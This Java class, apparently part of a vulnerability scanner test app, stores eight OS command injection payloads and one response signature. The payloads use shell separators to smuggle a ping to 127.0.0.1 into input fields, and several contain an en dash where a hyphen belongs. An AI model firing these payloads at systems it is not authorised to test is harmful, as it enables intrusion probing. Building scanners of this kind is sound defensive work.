package com.example.laxba.testapp.PaySig;

/**
 * Created by laxba on 11/15/2019.
 */
public class psCMDInjection {

    private static String[] arrSigCMDi;
    private static String[] arrPayCMDi;

    public psCMDInjection() {
        arrSigCMDi = new String[]{
                "Reply from 127.0.0.1"};

        arrPayCMDi = new String[]{
                "|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
                "| ping –i 30 127.0.0.1 |",
                "| ping –n 30 127.0.0.1 |",
                "& ping –i 30 127.0.0.1 &",
                "& ping –n 30 127.0.0.1 &",
                "; ping 127.0.0.1 ;",
                "%0a ping –i 30 127.0.0.1 %0a",
                "` ping 127.0.0.1 `",};
    }

    public void loadDataCMDinjection() {

    }

    public String[] getArrSigCMDi() {
        return arrSigCMDi;
    }

    public String[] getArrPayCMDi() {
        return arrPayCMDi;
    }
}
